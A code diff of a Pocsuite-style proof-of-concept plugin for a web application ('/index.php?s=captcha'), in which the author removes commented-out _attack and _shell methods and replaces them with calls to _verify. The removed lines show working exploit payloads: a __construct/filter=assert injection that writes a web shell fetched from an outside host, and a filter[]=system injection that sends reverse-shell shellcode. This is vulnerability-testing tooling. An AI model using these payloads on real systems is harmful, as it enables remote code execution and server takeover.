@@ -353,18 +353,6 @@ class DemoPOC(POCBase):
         # print(result)
         if flag in result:
             return 8009,'WEB-INF/web.xml'
-        # payloads = [
-        #     r"/index.php?s=captcha"
-        # ]
-        # for payload in payloads:
-        #     vul_url = url + payload
-        #     headers = {
-        #         "Content-Type": "application/x-www-form-urlencoded"
-        #     }
-        #     r = requests.post(vul_url, data=data, headers=headers)
-
-        #     if flag in r.text:
-        #         return payload, data
         else:
             return False
 
@@ -379,47 +367,12 @@ class DemoPOC(POCBase):
 
         return self.parse_output(result)
 
-    # def _attack(self):
-    #     result = {}
-    #     filename = random_str(6) + ".php"
-    #     shell_addr = "http://pocsuite.org/include_files/php_attack.txt"
-    #     payload = "/index.php?s=captcha&Test=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))".format(
-    #         filename=filename,
-    #         url=shell_addr)
-    #     vul_url = self.url + payload
-    #     headers = {
-    #         "Content-Type": "application/x-www-form-urlencoded"
-    #     }
-    #     data = "_method=__construct&filter=assert&method=get&server[REQUEST_METHOD]=print_r(file_put_contents(%27{filename}%27,file_get_contents(%27{url}%27)))".format(
-    #         filename=filename,
-    #         url=shell_addr
-    #     )
-    #     requests.post(vul_url, data=data, headers=headers)
-    #     r = requests.post(self.url + "/" + filename, data="c=phpinfo();", headers=headers)
-    #     if r.status_code == 200 and "PHP Extension Build" in r.text:
-    #         result['ShellInfo'] = {}
-    #         result['ShellInfo']['URL'] = self.url + "/" + filename
-    #         result['ShellInfo']['Content'] = shell_addr
-    #     return self.parse_output(result)
+    def _attack(self):
+        return self._verify() 
 
-    # def _shell(self):
-    #     vulurl = self.url + "/index.php?s=captcha"
-    #     # 生成写入文件的shellcode
-    #     _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(),
-    #                                     os_target=OS.LINUX,
-    #                                     os_target_arch=OS_ARCH.X86)
-    #     for i in _list:
-    #         data = {
-    #             '_method': '__construct',
-    #             'filter[]': 'system',
-    #             'method': 'get',
-    #             'server[REQUEST_METHOD]': i
-    #         }
-    #         headers = {
-    #             "Content-Type": "application/x-www-form-urlencoded"
-    #         }
-    #         requests.post(vulurl, data=data, headers=headers)
-
+    def _shell(self):
+        return self._verify() 
+        
     def parse_output(self, result):
         output = Output(self)
         if result:
